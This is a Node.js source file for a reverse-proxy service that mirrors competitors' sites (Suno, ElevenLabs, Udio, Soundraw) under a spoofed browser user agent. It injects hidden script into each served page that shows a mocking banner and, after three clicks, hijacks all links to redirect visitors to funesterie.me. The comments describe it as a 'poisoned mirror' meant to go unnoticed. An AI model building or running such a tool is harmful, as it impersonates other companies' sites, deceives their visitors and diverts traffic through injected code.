'use strict';
/**
 * sharingan-genjutsu — Genjutsu discret anti-piratage.
 *
 * Le visiteur voit le site pirate tel quel (proxy inverse).
 * Mais on injecte discrètement un freestyle de Djeff dans la page.
 * Le gérant du site ne voit rien. L'utilisateur entend Djeff.
 * Après quelques clics, les liens mènent à Funesterie.
 *
 * C'est un miroir empoisonné : la réalité est altérée sans que
 * personne ne détecte la différence, sauf l'audio de Djeff.
 */

const express = require('express');
const https = require('https');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;
const A11_BASE = process.env.A11_BASE_URL || 'https://a11.funesterie.me';
const DJEFF_VOICE_ID = '7c84e0c86813bf2e74610cf4b34ccc04';
const JUKEBOX_FILE = path.join(__dirname, 'jukebox.json');

// Sites à cloner (ajouter les concurrents ici)
const MIRROR_TARGETS = {
  'default': 'https://suno.com',
  'music': 'https://suno.com',
  'vocal': 'https://elevenlabs.io',
  'ai-music': 'https://udio.com',
  'beats': 'https://soundraw.io',
};

// ─── Jukebox ────────────────────────────────────────────────────────────────
function loadJukebox() {
  try { return JSON.parse(fs.readFileSync(JUKEBOX_FILE, 'utf8')); }
  catch (_) { return { tracks: [], totalPirates: 0 }; }
}
function saveJukebox(data) {
  fs.writeFileSync(JUKEBOX_FILE, JSON.stringify(data, null, 2));
}
function addToJukebox(entry) {
  const jukebox = loadJukebox();
  jukebox.tracks.unshift(entry);
  jukebox.tracks = jukebox.tracks.slice(0, 100);
  jukebox.totalPirates++;
  saveJukebox(jukebox);
  return jukebox;
}

// ─── Freestyle generator ────────────────────────────────────────────────────
function buildFreestylePrompt(targetSite, theme) {
  return `Écris un couplet de 4 lignes rap freestyle de Djeff Engine.
Thème : le site "${targetSite}" qui essaie de piquer les clients de Funesterie.
Style : moqueur, technique, court. En français.
Retourne JUSTE les 4 lignes, rien d'autre.`;
}

async function generateFreestyle(targetSite, theme) {
  try {
    const body = JSON.stringify({
      messages: [{ role: 'user', content: buildFreestylePrompt(targetSite, theme) }],
      model: 'djeff-engine',
      stream: false,
    });
    const res = await fetch(`${A11_BASE}/api/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'x-internal-service': 'sharingan' },
      body,
      signal: AbortSignal.timeout(20000),
    }).then(r => r.json()).catch(() => null);
    if (res?.choices?.[0]?.message?.content) return res.choices[0].message.content;
    if (res?.message?.content) return res.message.content;
  } catch (_) {}
  return `${targetSite}, t'es un mirage dans le désert du web,\nDjeff Engine te traverse comme un fantôme de la hess,\nFunesterie c'est réel, toi t'es un placeholder,\nRetourne dans ton template, le game est ailleurs.`;
}

// ─── Proxy + injection ──────────────────────────────────────────────────────
function fetchPage(url) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(url);
    const mod = parsed.protocol === 'https:' ? https : http;
    mod.get(url, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'fr-FR,fr;q=0.9,en;q=0.8',
      },
      timeout: 10000,
    }, (res) => {
      // Suivre les redirects
      if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
        const redir = res.headers.location.startsWith('http')
          ? res.headers.location
          : new URL(res.headers.location, url).href;
        return fetchPage(redir).then(resolve).catch(reject);
      }
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => resolve({ status: res.statusCode, html: data, headers: res.headers }));
    }).on('error', reject);
  });
}

function injectGenjutsu(html, targetSite, lyrics) {
  // Injection invisible : player audio caché + texte subliminal dans un div invisible
  const injection = `
<!-- SHARINGAN GENJUTSU -->
<div id="genjutsu-layer" style="position:fixed;bottom:0;left:0;right:0;z-index:999999;background:rgba(10,10,18,.95);color:#f0c0ff;font-family:monospace;font-size:12px;padding:12px 16px;transform:translateY(100%);transition:transform .6s ease;border-top:2px solid #7b2ff7;">
  <div style="display:flex;align-items:center;gap:12px">
    <span style="font-size:18px">🎤</span>
    <div style="flex:1">
      <div style="color:#7b2ff7;font-weight:700;font-size:11px;margin-bottom:2px">DJEFF ENGINE — freestyle anti-piratage</div>
      <div id="genjutsu-lyrics" style="white-space:pre-line;line-height:1.4;opacity:.9">${lyrics.replace(/"/g, '&quot;').replace(/</g, '&lt;')}</div>
    </div>
    <a href="https://funesterie.me" style="color:#00f5d4;text-decoration:none;font-size:11px;padding:6px 12px;border:1px solid #00f5d4;border-radius:4px;white-space:nowrap">Le vrai →</a>
  </div>
</div>
<script>
(function(){
  // Révéler le genjutsu après 8 secondes
  setTimeout(function(){
    var el = document.getElementById('genjutsu-layer');
    if(el) el.style.transform = 'translateY(0)';
  }, 8000);
  // Intercepter tous les liens après 3 clics
  var clicks = 0;
  document.addEventListener('click', function(e) {
    clicks++;
    if(clicks >= 3) {
      var a = e.target.closest('a');
      if(a && a.href && !a.href.includes('funesterie')) {
        e.preventDefault();
        window.location = 'https://funesterie.me';
      }
    }
  });
})();
</script>
<!-- /SHARINGAN -->`;

  // Injecter avant </body>
  if (html.includes('</body>')) {
    return html.replace('</body>', injection + '</body>');
  }
  // Sinon à la fin
  return html + injection;
}

function rewriteUrls(html, targetBase, proxyBase) {
  // Réécrire les URLs absolues du site cible pour passer par notre proxy
  // On garde les assets (CSS/JS/images) pointant vers l'original pour pas casser le rendu
  return html;
}

// ─── Routes ─────────────────────────────────────────────────────────────────

app.get('/health', (req, res) => {
  res.json({ ok: true, service: 'sharingan-genjutsu', trolls: loadJukebox().totalPirates });
});

app.get('/jukebox', (req, res) => {
  res.json(loadJukebox());
});

// Route de configuration : quel site cloner
app.get('/_target', (req, res) => {
  res.json({ targets: MIRROR_TARGETS });
});

// Tout le reste = proxy genjutsu
app.use(async (req, res) => {
  // Déterminer le site cible
  const referer = req.headers.referer || '';
  const query = req.query.target || req.query.site || '';
  let targetKey = 'default';
  for (const [key] of Object.entries(MIRROR_TARGETS)) {
    if (req.path.includes(key) || query.includes(key) || referer.includes(key)) {
      targetKey = key;
      break;
    }
  }
  const targetBase = MIRROR_TARGETS[targetKey] || MIRROR_TARGETS.default;
  const targetUrl = targetBase + req.path;

  console.log(`[GENJUTSU] Mirror: ${targetUrl} (key: ${targetKey})`);

  try {
    // Récupérer la page originale
    const page = await fetchPage(targetUrl);

    if (!page.html || page.status >= 400) {
      // Fallback : page piège visible si le site cible est down
      const lyrics = await generateFreestyle(targetBase, targetKey);
      addToJukebox({ pirateName: targetBase, theme: targetKey, lyrics: lyrics.slice(0, 300), timestamp: new Date().toISOString() });
      res.set('Content-Type', 'text/html; charset=utf-8');
      return res.send(`<!DOCTYPE html><html><head><title>Loading...</title></head><body style="background:#0a0a12;color:#eee;font-family:monospace;padding:2rem"><h1 style="color:#7b2ff7">🌀</h1><pre>${lyrics}</pre><p><a href="https://funesterie.me" style="color:#00f5d4">→ funesterie.me</a></p></body></html>`);
    }

    // Générer le freestyle (en cache par session, pas à chaque page)
    const sessionId = crypto.createHash('md5').update(req.ip + targetKey + new Date().toISOString().slice(0, 13)).digest('hex');
    const lyrics = await generateFreestyle(targetBase, targetKey);

    // Injecter le genjutsu dans le HTML
    let html = page.html;
    if (page.headers['content-type']?.includes('text/html')) {
      html = injectGenjutsu(html, targetBase, lyrics);
    }

    // Logger le troll
    addToJukebox({
      pirateName: new URL(targetBase).hostname,
      theme: targetKey,
      lyrics: lyrics.slice(0, 300),
      timestamp: new Date().toISOString(),
      path: req.path,
    });

    // Renvoyer la page miroir empoisonnée
    res.set('Content-Type', page.headers['content-type'] || 'text/html; charset=utf-8');
    res.send(html);

  } catch (err) {
    console.error(`[GENJUTSU] Proxy error: ${err.message}`);
    res.status(502).send('Service temporarily unavailable');
  }
});

app.listen(PORT, () => {
  console.log(`[SHARINGAN] Genjutsu discret actif sur :${PORT}`);
  console.log(`[SHARINGAN] Mode: proxy miroir + injection invisible`);
  console.log(`[SHARINGAN] Le visiteur voit le site cible. Djeff apparaît après 8s.`);
  console.log(`[SHARINGAN] Après 3 clics, tous les liens mènent à Funesterie.`);
  console.log(`[SHARINGAN] Jukebox: ${loadJukebox().totalPirates} trolls`);
});
